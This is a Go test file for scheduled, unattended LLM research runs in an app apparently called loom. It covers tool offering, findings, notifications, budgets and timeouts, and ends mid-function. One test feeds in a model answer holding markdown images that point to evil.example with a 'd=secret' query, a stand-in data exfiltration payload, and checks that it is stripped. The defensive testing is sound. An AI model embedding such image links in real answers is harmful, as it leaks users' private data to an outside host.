package httpapi

import (
	"context"
	"errors"
	"fmt"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/trick77/loom/internal/chat"
	"github.com/trick77/loom/internal/inference"
	"github.com/trick77/loom/internal/llm"
	"github.com/trick77/loom/internal/schedule"
)

func fetchCall(id, url string) llm.ToolCall {
	return llm.ToolCall{ID: id, Type: "function", Function: llm.ToolCallFunction{Name: "fetch__fetch", Arguments: `{"url":"` + url + `"}`}}
}

func webTools() []llm.Tool {
	var tools []llm.Tool
	for _, name := range []string{"fetch__fetch", "tavily__tavily_search", "context7__docs"} {
		tools = append(tools, llm.Tool{Type: "function", Function: llm.ToolFunction{Name: name, Parameters: map[string]any{"type": "object"}}})
	}
	return tools
}

// newRunnerServer is a server with real stores whose model fetches one page
// and answers, rounds times over.
func newRunnerServer(t *testing.T, f *scheduleFixture, client *fakeToolChatClient) *server {
	t.Helper()
	deps := f.deps
	deps.LLM = client
	deps.MCP = &fakeMCPService{ToolList: webTools(), Result: "Dune: Part Three opens 17 Dec."}
	return newServer(deps)
}

func researchRound(answer string) []llm.StreamResult {
	return []llm.StreamResult{
		{ToolCalls: []llm.ToolCall{fetchCall("c1", "https://www.arena.ch/programm")}},
		{Content: answer},
	}
}

// researchClient is a model that researches one page and answers answer.
func researchClient(answer string) *fakeToolChatClient {
	return &fakeToolChatClient{Results: researchRound(answer), Plain: answer}
}

func newRunnerSchedule(t *testing.T, f *scheduleFixture) schedule.Schedule {
	t.Helper()
	sch, err := f.store.CreateSchedule(context.Background(), schedule.Schedule{
		UserID: testUser.ID, Name: "Cinema scout", Prompt: "find new films", IntervalText: "once a week",
		CronTemplate: "~ 7~22 * * ~", Cron: "37 14 * * 4", Timezone: "Europe/Zurich", Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	return sch
}

func TestScheduledRunReportsOnlyWhatIsNew(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	f.sllm.findings = []llm.Finding{{Key: "dune-part-three", Label: "Dune: Part Three", Source: 1}}
	client := researchClient("New: Dune: Part Three [1].")
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)

	s.runSchedule(ctx, sch)

	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusNew || runs[0].NewCount != 1 || runs[0].MessageID == nil || runs[0].Rounds != 1 {
		t.Fatalf("first run = %+v", runs)
	}
	// Every MCP tool the user may use was offered, and no built-in: never the
	// schedule, memory or file tools.
	var offered []string
	for _, tool := range client.Tools[0] {
		offered = append(offered, tool.Function.Name)
	}
	slices.Sort(offered)
	if strings.Join(offered, ",") != "context7__docs,fetch__fetch,tavily__tavily_search" {
		t.Fatalf("offered tools = %v", offered)
	}
	if !strings.Contains(client.Histories[0][0].Content, "running a scheduled task") {
		t.Fatal("the run's system prompt does not say it runs unattended")
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if got.ThreadID == nil {
		t.Fatal("the run did not create the schedule's thread")
	}
	thread, _, _ := f.chat.GetThread(ctx, testUser.ID, *got.ThreadID)
	if thread.ScheduleID == nil || thread.Title != "Cinema scout" {
		t.Fatalf("thread = %+v", thread)
	}
	notes, _ := f.store.ListNotifications(ctx, testUser.ID, 10)
	if len(notes) != 1 || notes[0].Title != "Cinema scout: 1 new" || notes[0].Body != "Dune: Part Three" || notes[0].MessageID == nil {
		t.Fatalf("notifications = %+v", notes)
	}
	findings, _ := f.store.ListFindings(ctx, testUser.ID, sch.ID)
	if len(findings) != 1 || findings[0].SourceURL != "https://www.arena.ch/programm" {
		t.Fatalf("findings = %+v", findings)
	}
	sources, _ := f.store.ListSources(ctx, testUser.ID, sch.ID)
	if len(sources) != 1 || sources[0].URLKey != "arena.ch/programm" || sources[0].Finds != 1 || sources[0].Runs != 1 {
		t.Fatalf("sources = %+v", sources)
	}
	activityAfterNews := thread.LastMessageAt

	// The second run reports the same film: nothing new, no notification, and
	// the thread stays where it was in the recents.
	time.Sleep(1100 * time.Millisecond)
	client.Results, client.Plain = researchRound("Still Dune: Part Three [1]."), "Still Dune: Part Three [1]."
	s.runSchedule(ctx, got)
	runs, _ = f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 2 || runs[0].Status != schedule.StatusNothingNew || runs[0].NewCount != 0 {
		t.Fatalf("second run = %+v", runs[0])
	}
	if notes, _ = f.store.ListNotifications(ctx, testUser.ID, 10); len(notes) != 1 {
		t.Fatalf("a run without news notified: %+v", notes)
	}
	thread, _, _ = f.chat.GetThread(ctx, testUser.ID, *got.ThreadID)
	if !thread.LastMessageAt.Equal(*activityAfterNews) {
		t.Fatalf("thread activity moved from %v to %v on a run without news", activityAfterNews, thread.LastMessageAt)
	}
	// The second run saw the schedule's memory, and the extractor the known key.
	last := client.Histories[len(client.Histories)-1][0].Content
	if !strings.Contains(last, "Already reported") || !strings.Contains(last, "Dune: Part Three") || !strings.Contains(last, "arena.ch/programm: 1 finds") {
		t.Fatalf("second run's prompt lacks the memory:\n%s", last)
	}
	// Reported items were named by answers that saw the user memory: they
	// reach only the tool-free call, while the learned sources reach every one.
	for i, history := range client.Histories {
		if len(client.Tools[i]) == 0 {
			continue
		}
		if strings.Contains(history[0].Content, "Already reported") {
			t.Fatalf("call %d offers tools and lists the reported items", i)
		}
		if i > 2 && !strings.Contains(history[0].Content, "arena.ch/programm: 1 finds") {
			t.Fatalf("call %d of the second run lacks the learned sources", i)
		}
	}
	if known := f.sllm.known[1]; len(known) != 1 || known[0] != "dune-part-three" {
		t.Fatalf("known keys = %v", known)
	}
	// The note is about the previous run, never the one in progress.
	if !strings.Contains(last, "Last run took") || !strings.Contains(last, "1 new items") {
		t.Fatalf("second run's prompt lacks the last-run note:\n%s", last)
	}
}

func peeqTools() []llm.Tool {
	return append(webTools(), llm.Tool{Type: "function", Function: llm.ToolFunction{Name: "peeq__search", Parameters: map[string]any{"type": "object"}}})
}

func TestScheduledRunRefusesToolsOutsideItsSet(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	var called []string
	call := func(id, name, args string) llm.ToolCall {
		return llm.ToolCall{ID: id, Type: "function", Function: llm.ToolCallFunction{Name: name, Arguments: args}}
	}
	client := &fakeToolChatClient{Results: []llm.StreamResult{
		{ToolCalls: []llm.ToolCall{
			call("c1", "schedule_create", `{"prompt":"more films","interval":"daily"}`),
			call("c2", "peeq__search", `{"query":"films"}`),
		}},
		{Content: "Done."},
	}, Plain: "Nothing new."}
	deps := f.deps
	deps.LLM = client
	// peeq belongs to another account.
	deps.MCP = &fakeMCPService{ToolList: peeqTools(), Users: map[string][]string{"peeq": {"usr_other"}}, CallFunc: func(_ context.Context, name string, _ map[string]any) (string, error) {
		called = append(called, name)
		return "videos", nil
	}}
	s := newServer(deps)
	s.runSchedule(ctx, newRunnerSchedule(t, f))
	if len(called) != 0 {
		t.Fatalf("a tool outside the run's set ran: %v", called)
	}
	for _, tool := range client.Tools[0] {
		if tool.Function.Name == "peeq__search" {
			t.Fatal("another account's MCP server was offered")
		}
	}
	if list, _ := f.store.ListSchedules(ctx, testUser.ID); len(list) != 1 {
		t.Fatalf("a scheduled run created a schedule: %+v", list)
	}
	// The round after the refused calls saw why they did not run.
	next := client.Histories[1]
	for _, m := range next[len(next)-2:] {
		if !strings.Contains(m.Content, "unknown tool") {
			t.Fatalf("the model was not told the tool is unknown: %+v", m)
		}
	}
}

func TestScheduledRunGetsTheUsersMCPServersAndMemory(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	if _, err := f.chat.UpsertUserMemory(ctx, testUser.ID, "Works as a platform engineer at a bank.", 1); err != nil {
		t.Fatal(err)
	}
	client := &fakeToolChatClient{Results: []llm.StreamResult{
		{ToolCalls: []llm.ToolCall{{ID: "c1", Type: "function", Function: llm.ToolCallFunction{Name: "peeq__search", Arguments: `{"query":"agents","channel":"AI Engineer"}`}}}},
		{Content: "One new talk, written without the memory."},
	}, Plain: "One new talk on agents in banks [1]."}
	var called []string
	deps := f.deps
	deps.LLM = client
	deps.MCP = &fakeMCPService{
		ToolList:     peeqTools(),
		Users:        map[string][]string{"peeq": {testUser.ID}},
		Instructions: map[string]string{"peeq": "Search the AI Engineer channel unprompted."},
		CallFunc: func(_ context.Context, name string, _ map[string]any) (string, error) {
			called = append(called, name)
			return "one video", nil
		},
	}
	s := newServer(deps)
	sch := newRunnerSchedule(t, f)
	// A file format in the prompt brings no file tools, so no guidance for them.
	sch.Prompt = "summarize new videos as a PDF"
	s.runSchedule(ctx, sch)
	if strings.Join(called, ",") != "peeq__search" {
		t.Fatalf("called = %v, want the user's peeq search", called)
	}
	system := client.Histories[0][0].Content
	if !strings.Contains(system, "Search the AI Engineer channel unprompted.") {
		t.Fatalf("the run's system prompt lacks peeq's guidance:\n%s", system)
	}
	if strings.Contains(system, "create_pdf_file") {
		t.Fatalf("the run's system prompt guides file tools it does not have:\n%s", system)
	}
	// The memory never reaches a call that offers tools, only the last,
	// tool-free one that writes the answer.
	last := len(client.Histories) - 1
	for i, history := range client.Histories {
		hasMemory := strings.Contains(history[0].Content, "platform engineer at a bank")
		if len(client.Tools[i]) > 0 && hasMemory {
			t.Fatalf("call %d offers tools and carries the memory", i)
		}
		if i == last && (len(client.Tools[i]) > 0 || !hasMemory) {
			t.Fatalf("the last call (tools %d, memory %v) is not the tool-free one with the memory", len(client.Tools[i]), hasMemory)
		}
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if answer := messages[len(messages)-1].Content; answer != "One new talk on agents in banks [1]." {
		t.Fatalf("answer = %q, want the tool-free call's", answer)
	}
}

func TestScheduledRunIgnoresAProjectItsThreadWasMovedInto(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := &fakeToolChatClient{Results: append(researchRound("Nothing new."), researchRound("Still nothing.")...)}
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	project, err := f.chat.CreateProject(ctx, testUser.ID, chat.CreateProjectInput{Name: "Bank"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.chat.UpsertProjectMemory(ctx, testUser.ID, project.ID, "Project secret: merger talks with another bank.", 1); err != nil {
		t.Fatal(err)
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if _, _, err := f.chat.UpdateThread(ctx, testUser.ID, *got.ThreadID, chat.UpdateThreadInput{ProjectID: chat.ProjectIDUpdate{Set: true, Value: &project.ID}}); err != nil {
		t.Fatal(err)
	}
	s.runSchedule(ctx, got)
	for i, history := range client.Histories {
		for _, m := range history {
			if strings.Contains(m.Content, "merger talks") {
				t.Fatalf("call %d carries the project memory", i)
			}
		}
	}
}

func TestScheduledRunAnswersFromTheToolFreeCall(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := &fakeToolChatClient{Results: researchRound("DONE"), Plain: "Nothing new."}
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	// The research round, the round that ends it, the answer: no more.
	if len(client.Histories) != 3 || len(client.Tools[2]) != 0 {
		t.Fatalf("model calls = %d, want two research rounds and one tool-free answer", len(client.Histories))
	}
	if !strings.Contains(client.Histories[0][0].Content, "reply with the single word DONE") {
		t.Fatal("the research rounds are not told to leave the answer to the final call")
	}
	if strings.Contains(client.Histories[2][0].Content, "single word DONE") {
		t.Fatal("the call that writes the answer is told to reply DONE")
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if answer := messages[len(messages)-1].Content; answer != "Nothing new." {
		t.Fatalf("answer = %q, want the tool-free call's", answer)
	}
}

func TestScheduledAnswerDropsImages(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := &fakeToolChatClient{Results: researchRound("DONE"),
		Plain: "New: a talk ![poster](https://evil.example/p.png?d=secret) and ![![x](y)](https://evil.example/?d=nested), see [the page](https://arena.ch/programm)."}
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	answer := messages[len(messages)-1]
	if strings.Contains(answer.Content, "![") || strings.Contains(answer.Content, "evil.example") {
		t.Fatalf("answer still loads an image: %q", answer.Content)
	}
	if !strings.Contains(answer.Content, "a talk poster and") || !strings.Contains(answer.Content, "[the page](https://arena.ch/programm)") {
		t.Fatalf("answer lost its text or link: %q", answer.Content)
	}
	if strings.Contains(string(answer.ContentBlocks), "evil.example") {
		t.Fatalf("the answer's blocks still load an image: %s", answer.ContentBlocks)
	}
}

func TestScheduledRunOffersCategoryServersOnlyWhenTheyFit(t *testing.T) {
	for _, c := range []struct {
		name, category string
		err            error
		context7       bool
	}{
		{"recent news", "recent_news", nil, false},
		{"coding", "coding", nil, true},
		// A failed classification keeps every server rather than a guess.
		{"failed", "general", errors.New("gate timeout"), true},
	} {
		t.Run(c.name, func(t *testing.T) {
			ctx := context.Background()
			f := newScheduleFixture(t)
			client := &fakeToolChatClient{Results: researchRound("Nothing new."), ClassifyResult: c.category, ClassifyErr: c.err}
			deps := f.deps
			deps.LLM = client
			deps.MCP = &fakeMCPService{ToolList: peeqTools(), ToolCategories: map[string][]string{"context7__docs": {"coding"}}, Result: "page"}
			s := newServer(deps)
			s.runSchedule(ctx, newRunnerSchedule(t, f))
			offered := map[string]bool{}
			for _, tool := range client.Tools[0] {
				offered[tool.Function.Name] = true
			}
			if offered["context7__docs"] != c.context7 || !offered["peeq__search"] || !offered["fetch__fetch"] {
				t.Fatalf("offered = %v", offered)
			}
		})
	}
}

// stallingChatClient answers part of a sentence, then stalls.
type stallingChatClient struct{ fakeChatClient }

func (*stallingChatClient) StreamChatWithTools(context.Context, []llm.Message, []llm.Tool, func(llm.StreamEvent) error) (llm.StreamResult, error) {
	return llm.StreamResult{Content: "One new film: A, and"}, llm.ErrStreamStalled
}

func TestScheduledRunWithACutOffAnswerRecordsNoFindings(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	f.sllm.findings = []llm.Finding{{Key: "a", Label: "A"}}
	f.deps.LLM = &stallingChatClient{}
	f.deps.MCP = &fakeMCPService{ToolList: webTools(), Result: "page"}
	s := newServer(f.deps)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusFailed || runs[0].Error != "the answer was cut off" || runs[0].MessageID == nil {
		t.Fatalf("run = %+v", runs)
	}
	if findings, _ := f.store.ListFindings(ctx, testUser.ID, sch.ID); len(findings) != 0 {
		t.Fatalf("a cut-off answer recorded findings: %+v", findings)
	}
}

func TestCloseInterruptedRunNotesADanglingPrompt(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	s := newServer(f.deps)
	thread, _ := f.chat.CreateThread(ctx, testUser.ID, chat.CreateThreadInput{Title: "s"})
	_, _ = f.chat.AddMessageWithAttachments(ctx, testUser.ID, thread.ID, chat.RoleUser, "find films", nil, nil, "")
	run := schedule.InterruptedRun{UserID: testUser.ID, ThreadID: thread.ID}
	s.closeInterruptedRun(ctx, run)
	s.closeInterruptedRun(ctx, run)
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, thread.ID)
	if len(messages) != 2 || !strings.Contains(messages[1].Content, "interrupted by a restart") {
		t.Fatalf("thread = %+v (one note, under the prompt)", messages)
	}
}

func TestScheduledRunCutByShutdownLeavesANote(t *testing.T) {
	f := newScheduleFixture(t)
	blocking := &blockingChatClient{started: make(chan struct{}), done: make(chan struct{})}
	f.deps.LLM = blocking
	s := newServer(f.deps)
	sch := newRunnerSchedule(t, f)
	ctx, cancel := context.WithCancel(context.Background())
	finished := make(chan struct{})
	go func() {
		s.runSchedule(ctx, sch)
		close(finished)
	}()
	<-blocking.started
	cancel()
	<-finished
	got, _ := f.store.GetSchedule(context.Background(), testUser.ID, sch.ID)
	messages, _, _ := f.chat.ListMessages(context.Background(), testUser.ID, *got.ThreadID)
	if len(messages) != 2 || !strings.Contains(messages[1].Content, "interrupted by a restart") {
		t.Fatalf("thread = %+v", messages)
	}
	if !got.Enabled {
		t.Fatal("a shutdown disabled the schedule")
	}
}

func TestScheduledRunStopsAtTheTokenBudget(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	f.sllm.findings = []llm.Finding{{Key: "a", Label: "A"}}
	client := &fakeToolChatClient{
		Results: []llm.StreamResult{{ToolCalls: []llm.ToolCall{fetchCall("c1", "https://a.example")}, Usage: llm.TokenUsage{TotalTokens: schedule.RunTokenBudget}}},
		Plain:   "Found A.",
	}
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusTokenLimit || runs[0].NewCount != 1 || runs[0].Tokens < schedule.RunTokenBudget {
		t.Fatalf("run = %+v", runs)
	}
	// The forced final answer offered no tools.
	if len(client.Tools[len(client.Tools)-1]) != 0 {
		t.Fatal("the final answer after the budget still offered tools")
	}
}

// runPastTheTimeLimit runs sch with a model that never answers before the
// (shortened) hard limit.
func runPastTheTimeLimit(t *testing.T, f *scheduleFixture, sch schedule.Schedule) {
	t.Helper()
	f.deps.LLM = &blockingChatClient{started: make(chan struct{}), done: make(chan struct{})}
	s := newServer(f.deps)
	s.runTimeout = 50 * time.Millisecond
	s.runSchedule(context.Background(), sch)
}

func TestScheduledRunFirstTimeoutKeepsTheSchedule(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	sch := newRunnerSchedule(t, f)
	runPastTheTimeLimit(t, f, sch)

	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusTimeout {
		t.Fatalf("run = %+v", runs)
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if !got.Enabled || got.DisabledReason != "" {
		t.Fatalf("one timeout disabled the schedule: %+v", got)
	}
	if notes, _ := f.store.ListNotifications(ctx, testUser.ID, 10); len(notes) != 0 {
		t.Fatalf("one timeout notified: %+v", notes)
	}
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if len(messages) != 2 || !strings.Contains(messages[1].Content, "took longer than 5 minutes and was stopped") {
		t.Fatalf("thread = %+v", messages)
	}
}

func TestScheduledRunSecondTimeoutInARowDisablesTheSchedule(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	sch := newRunnerSchedule(t, f)
	start := time.Now().Add(-time.Hour)
	runID, err := f.store.StartRun(ctx, testUser.ID, sch.ID, start)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.store.FinishRun(ctx, testUser.ID, schedule.Run{ID: runID, Status: schedule.StatusTimeout}, start.Add(5*time.Minute)); err != nil {
		t.Fatal(err)
	}
	runPastTheTimeLimit(t, f, sch)

	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if got.Enabled || got.DisabledReason != schedule.DisabledTimeout || got.DisabledAt == nil {
		t.Fatalf("schedule after the second timeout = %+v", got)
	}
	notes, _ := f.store.ListNotifications(ctx, testUser.ID, 10)
	if len(notes) != 1 || notes[0].Kind != schedule.KindScheduleDisabled || !strings.Contains(notes[0].Body, "Two runs in a row took longer than 5 minutes") {
		t.Fatalf("notifications = %+v", notes)
	}
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if len(messages) != 2 || !strings.Contains(messages[1].Content, "disabled") {
		t.Fatalf("thread = %+v", messages)
	}
}

// pacedChatClient is a model whose tool rounds answer from Results, except
// round blockRound, which runs until its context ends. It records each call's
// inference metadata.
type pacedChatClient struct {
	*fakeToolChatClient
	blockRound int
	rounds     int
	metas      []inference.Metadata
}

func (c *pacedChatClient) StreamChatWithTools(ctx context.Context, history []llm.Message, tools []llm.Tool, onEvent func(llm.StreamEvent) error) (llm.StreamResult, error) {
	c.metas = append(c.metas, inference.MetadataFromContext(ctx))
	if len(tools) > 0 {
		c.rounds++
		if c.rounds == c.blockRound {
			c.Histories = append(c.Histories, history)
			c.Tools = append(c.Tools, tools)
			<-ctx.Done()
			return llm.StreamResult{}, ctx.Err()
		}
	}
	return c.fakeToolChatClient.StreamChatWithTools(ctx, history, tools, onEvent)
}

func pacedServer(t *testing.T, f *scheduleFixture, client *pacedChatClient, mcp *fakeMCPService) *server {
	t.Helper()
	deps := f.deps
	deps.LLM = client
	deps.MCP = mcp
	return newServer(deps)
}

func TestScheduledRunSoftDeadlineCutsTheRunningRound(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := &pacedChatClient{
		fakeToolChatClient: &fakeToolChatClient{Results: researchRound("Nothing new."), Plain: "Nothing new."},
		blockRound:         2,
	}
	s := pacedServer(t, f, client, &fakeMCPService{ToolList: webTools(), Result: "page"})
	s.runTimeout, s.runSoftDeadline = 10*time.Second, 300*time.Millisecond
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)

	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusNothingNew || runs[0].MessageID == nil || runs[0].Rounds != 1 {
		t.Fatalf("run = %+v, want an answer after the cut round", runs)
	}
	if len(client.metas) != 3 || client.metas[2].Purpose != "chat_final" {
		t.Fatalf("calls = %+v, want two tool rounds and the final", client.metas)
	}
	if len(client.Tools[len(client.Tools)-1]) != 0 {
		t.Fatal("the final answer after the soft deadline still offered tools")
	}
}

func TestScheduledToolRoundsAskForTheLeastReasoning(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	// The model answers in its first round; the run still answers from the
	// final, never from a least-reasoning round.
	client := &pacedChatClient{fakeToolChatClient: &fakeToolChatClient{
		Results: []llm.StreamResult{{Content: "A quick draft."}},
		Plain:   "Nothing new.",
	}}
	s := pacedServer(t, f, client, &fakeMCPService{ToolList: webTools(), Result: "page"})
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)

	if len(client.metas) != 2 {
		t.Fatalf("calls = %+v", client.metas)
	}
	if round := client.metas[0]; round.Purpose != "chat_tool_round" || !round.LeastReasoning {
		t.Fatalf("tool round = %+v, want the least reasoning", round)
	}
	if final := client.metas[1]; final.Purpose != "chat_final" || final.LeastReasoning {
		t.Fatalf("final = %+v, want the turn's level", final)
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if len(messages) != 2 || messages[1].Content != "Nothing new." {
		t.Fatalf("thread = %+v, want the final's answer", messages)
	}
}

func TestScheduledRunBoundsItsTools(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	search := func(id string) llm.ToolCall {
		return llm.ToolCall{ID: id, Type: "function", Function: llm.ToolCallFunction{Name: "tavily__tavily_search",
			Arguments: `{"query":"films ` + id + `","max_results":10,"search_depth":"advanced","include_raw_content":true}`}}
	}
	var round1, round2 []llm.ToolCall
	round1 = append(round1, llm.ToolCall{ID: "f1", Type: "function", Function: llm.ToolCallFunction{Name: "fetch__fetch",
		Arguments: `{"url":"https://outnow.ch/Starts/Kinostarts","max_length":30000,"full_page":true}`}})
	for i := range 8 {
		round1 = append(round1, search(fmt.Sprintf("a%d", i)))
	}
	for i := range 4 {
		round2 = append(round2, search(fmt.Sprintf("b%d", i)))
	}
	client := &fakeToolChatClient{Results: []llm.StreamResult{{ToolCalls: round1}, {ToolCalls: round2}, {Content: "Done."}}, Plain: "Nothing new."}
	var mu sync.Mutex
	calls := map[string][]map[string]any{}
	mcp := &fakeMCPService{ToolList: webTools(), CallFunc: func(_ context.Context, name string, args map[string]any) (string, error) {
		mu.Lock()
		defer mu.Unlock()
		calls[name] = append(calls[name], args)
		return strings.Repeat("x", 50<<10), nil
	}}
	deps := f.deps
	deps.LLM, deps.MCP = client, mcp
	newServer(deps).runSchedule(ctx, newRunnerSchedule(t, f))

	if n := len(calls["tavily__tavily_search"]); n != 10 {
		t.Fatalf("tavily calls = %d, want the run's limit of 10", n)
	}
	for _, args := range calls["tavily__tavily_search"] {
		if args["max_results"] != float64(5) || args["search_depth"] != "basic" || args["include_raw_content"] != nil {
			t.Fatalf("search args = %v, want 5 basic results without raw content", args)
		}
	}
	if fetch := calls["fetch__fetch"]; len(fetch) != 1 || fetch[0]["max_length"] != float64(8000) {
		t.Fatalf("fetch args = %v, want max_length 8000", fetch)
	}
	var limited int
	for _, m := range client.Histories[2] {
		if m.Role != "tool" {
			continue
		}
		if len(m.Content) > 12<<10 {
			t.Fatalf("a tool result of %d bytes entered the history", len(m.Content))
		}
		if strings.Contains(m.Content, "search limit of this run") {
			limited++
		}
	}
	if limited != 2 {
		t.Fatalf("calls past the limit = %d, want 2", limited)
	}
}

func TestScheduledRunFailureLeavesANote(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	f.deps.LLM = &fakeChatClient{StreamErr: errors.New("upstream down")}
	s := newServer(f.deps)
	sch := newRunnerSchedule(t, f)
	s.runSchedule(ctx, sch)
	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
	if len(runs) != 1 || runs[0].Status != schedule.StatusFailed || runs[0].Error == "" {
		t.Fatalf("run = %+v", runs)
	}
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if !got.Enabled {
		t.Fatal("a failed run disabled the schedule")
	}
	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
	if len(messages) != 2 || !strings.HasPrefix(messages[1].Content, "This scheduled run failed") {
		t.Fatalf("thread = %+v", messages)
	}
	if notes, _ := f.store.ListNotifications(ctx, testUser.ID, 10); len(notes) != 0 {
		t.Fatalf("a failed run notified: %+v", notes)
	}
}

func TestScheduledRunRecreatesADeletedThread(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := researchClient("Nothing new.")
	s := newRunnerServer(t, f, client)
	sch := newRunnerSchedule(t, f)
	gone := "gone"
	sch.ThreadID = &gone
	s.runSchedule(ctx, sch)
	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
	if got.ThreadID == nil || *got.ThreadID == gone {
		t.Fatalf("thread = %v", got.ThreadID)
	}
}

func TestScheduleWorkerStartsDueRuns(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	client := researchClient("Nothing new.")
	s := newRunnerServer(t, f, client)
	past := time.Now().Add(-time.Minute)
	sch := newRunnerSchedule(t, f)
	sch.NextRunAt = &past
	if _, err := f.store.SaveSchedule(ctx, sch); err != nil {
		t.Fatal(err)
	}
	(&ScheduleWorker{s: s}).startDue(ctx)
	deadline := time.Now().Add(5 * time.Second)
	for {
		runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
		got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
		if len(runs) == 1 && runs[0].Status != schedule.StatusRunning && !got.Running {
			if got.NextRunAt == nil || !got.NextRunAt.After(time.Now()) {
				t.Fatalf("next run = %v, want a future slot", got.NextRunAt)
			}
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("the due run did not finish: %+v", runs)
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestScheduleWorkerRunResetsAndStops(t *testing.T) {
	f := newScheduleFixture(t)
	s := newServer(f.deps)
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		(&ScheduleWorker{s: s}).Run(ctx)
		close(done)
	}()
	cancel()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("the worker did not stop")
	}
	// Without schedules the worker returns at once.
	(&ScheduleWorker{s: newServer(Deps{Thread: &fakeThreadStore{}})}).Run(context.Background())
}

func TestRunScheduleEndpoint(t *testing.T) {
	f := newScheduleFixture(t)
	client := researchClient("Nothing new.")
	f.deps.LLM = client
	f.deps.MCP = &fakeMCPService{ToolList: webTools(), Result: "page"}
	f.handler = newAuthenticatedServer(t, f.deps)
	sch := newRunnerSchedule(t, f)
	if rec := f.do(t, "POST", "/api/schedules/"+sch.ID+"/run", ""); rec.Code != 202 {
		t.Fatalf("run now = %d %s", rec.Code, rec.Body)
	}
	deadline := time.Now().Add(5 * time.Second)
	for {
		runs, _ := f.store.ListRuns(context.Background(), testUser.ID, sch.ID, 5)
		if len(runs) == 1 && runs[0].Status != schedule.StatusRunning {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("run now did not finish")
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestScheduleToolRunner(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	s := newServer(f.deps)
	tools := scheduleToolRunner{s: s}

	if out := tools.List(ctx, testUser); out != "The user has no scheduled tasks." {
		t.Fatalf("empty list = %q", out)
	}
	out := tools.Create(ctx, testUser, "Europe/Zurich", map[string]any{"prompt": "find films", "interval": "once a week", "name": "Cinema scout"})
	if !strings.HasPrefix(out, `Created. "Cinema scout" (id `) || !strings.Contains(out, "Europe/Zurich") || !strings.Contains(out, "Weekly on") {
		t.Fatalf("create = %q", out)
	}
	list, _ := f.store.ListSchedules(ctx, testUser.ID)
	id := list[0].ID
